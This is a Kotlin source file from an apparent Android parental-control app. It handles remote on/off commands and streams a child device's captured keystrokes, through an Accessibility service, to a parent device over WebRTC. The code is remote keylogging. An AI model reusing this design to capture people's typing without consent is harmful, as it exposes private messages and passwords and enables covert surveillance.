package com.nexus.child.components.keyboard

import android.util.Log

/**
 * KeyboardCommandHandler coordinates WebRTC DataChannel commands and telemetry payloads
 * for real-time keyboard auditing between Child and Parent.
 *
 * Hey friend! Here is the command handshake protocol:
 * 1. Parent clicks Play in Keyboard Audit panel -> sends "KEYBOARD_ON" over the DataChannel.
 * 2. We verify that Accessibility permission is granted on the child device.
 *    - If denied: we send "KEYBOARD_ERROR: Accessibility permission not enabled on child device".
 * 3. We activate monitoring and send "KEYBOARD_STARTED" confirmation.
 * 4. We fetch any recent typing events from the in-memory ring buffer and dispatch "KEYBOARD_SNAPSHOT"
 *    so the parent console instantly has recent session context.
 * 5. As the child types, completed/debounced input sessions dispatch real-time "KEYBOARD_NEW" packets.
 * 6. Parent clicks Pause -> sends "KEYBOARD_OFF". We halt monitoring and send "KEYBOARD_STOPPED".
 * 7. If peer disconnects -> onPeerDisconnected() shuts down listeners immediately to prevent battery drain.
 */
class KeyboardCommandHandler(
    private val keyboardController: IKeyboardController,
    private val dataSender: (message: String) -> Boolean
) {

    companion object {
        private const val TAG = "KeyboardCmdHandler"

        // Commands
        const val CMD_KEYBOARD_ON = "KEYBOARD_ON"
        const val CMD_KEYBOARD_OFF = "KEYBOARD_OFF"
        const val ALIAS_KEYBOARD_START = "KEYBOARD_START"
        const val ALIAS_START_KEYBOARD = "START_KEYBOARD"
        const val ALIAS_KEYBOARD_STOP = "KEYBOARD_STOP"
        const val ALIAS_STOP_KEYBOARD = "STOP_KEYBOARD"

        // Responses
        const val RESP_KEYBOARD_STARTED = "KEYBOARD_STARTED"
        const val RESP_KEYBOARD_STOPPED = "KEYBOARD_STOPPED"
        const val RESP_KEYBOARD_ERROR_PREFIX = "KEYBOARD_ERROR: "

        // Telemetry Types
        const val TYPE_KEYBOARD_SNAPSHOT = "KEYBOARD_SNAPSHOT"
        const val TYPE_KEYBOARD_NEW = "KEYBOARD_NEW"
    }

    /**
     * Inspects incoming DataChannel strings and executes the matching keyboard command.
     */
    fun handleCommand(command: String): Boolean {
        return when (command.trim()) {
            CMD_KEYBOARD_ON, ALIAS_KEYBOARD_START, ALIAS_START_KEYBOARD -> {
                handleKeyboardOn()
                true
            }
            CMD_KEYBOARD_OFF, ALIAS_KEYBOARD_STOP, ALIAS_STOP_KEYBOARD -> {
                handleKeyboardOff()
                true
            }
            else -> false
        }
    }

    /**
     * Activates keyboard auditing, sends confirmation, and dispatches recent session snapshots.
     */
    private fun handleKeyboardOn() {
        Log.d(TAG, "Processing KEYBOARD_ON command...")

        // Step 1: Permission check
        if (!keyboardController.hasAccessibilityPermission()) {
            val errorMsg = "${RESP_KEYBOARD_ERROR_PREFIX}Accessibility permission not enabled on child device"
            Log.w(TAG, errorMsg)
            dataSender(errorMsg)
            return
        }

        // Step 2: Register real-time keystroke observation callback
        val started = keyboardController.startMonitoring { newRecord ->
            sendNewKeystrokeRecord(newRecord)
        }

        if (started) {
            Log.d(TAG, "Keyboard monitoring started. Sending confirmation: $RESP_KEYBOARD_STARTED")
            dataSender(RESP_KEYBOARD_STARTED)

            // Step 3: Fetch cached session snapshot and dispatch to parent
            try {
                val recentList = keyboardController.getRecentRecords()
                if (recentList.isNotEmpty()) {
                    val snapshotJson = buildKeyboardSnapshotJson(recentList)
                    dataSender(snapshotJson)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error dispatching keyboard snapshot: ${e.message}", e)
            }
        } else {
            val errorMsg = "${RESP_KEYBOARD_ERROR_PREFIX}Failed to start keyboard monitoring service"
            Log.e(TAG, errorMsg)
            dataSender(errorMsg)
        }
    }

    /**
     * Halts keyboard auditing and sends confirmation.
     */
    private fun handleKeyboardOff() {
        Log.d(TAG, "Processing KEYBOARD_OFF command...")
        keyboardController.stopMonitoring()
        dataSender(RESP_KEYBOARD_STOPPED)
        Log.d(TAG, "Keyboard monitoring stopped. Sent confirmation: $RESP_KEYBOARD_STOPPED")
    }

    /**
     * Dispatches a real-time event packet for a newly completed typing sequence.
     */
    private fun sendNewKeystrokeRecord(record: KeyboardRecord) {
        try {
            val packet = buildNewKeystrokeJson(record)
            dataSender(packet)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to serialize KEYBOARD_NEW packet: ${e.message}", e)
        }
    }

    /**
     * Builds the JSON snapshot packet containing recent cached keystroke entries.
     */
    fun buildKeyboardSnapshotJson(records: List<KeyboardRecord>): String {
        val recordsJson = records.joinToString(separator = ",", prefix = "[", postfix = "]") { it.toJsonString() }
        return "{\"type\":\"$TYPE_KEYBOARD_SNAPSHOT\"," +
                "\"count\":${records.size}," +
                "\"records\":$recordsJson}"
    }

    /**
     * Builds the JSON packet for a single new keystroke event.
     */
    fun buildNewKeystrokeJson(record: KeyboardRecord): String {
        return "{\"type\":\"$TYPE_KEYBOARD_NEW\",\"record\":${record.toJsonString()}}"
    }

    /**
     * Invoked when the WebRTC peer connection is dropped or disconnected.
     * Guarantees all listeners are stopped to prevent battery leakage.
     */
    fun onPeerDisconnected() {
        Log.d(TAG, "Peer disconnected. Halting keyboard monitoring fail-safe...")
        keyboardController.stopMonitoring()
    }

    /**
     * Cleans up all controller references.
     */
    fun cleanup() {
        keyboardController.cleanup()
    }
}
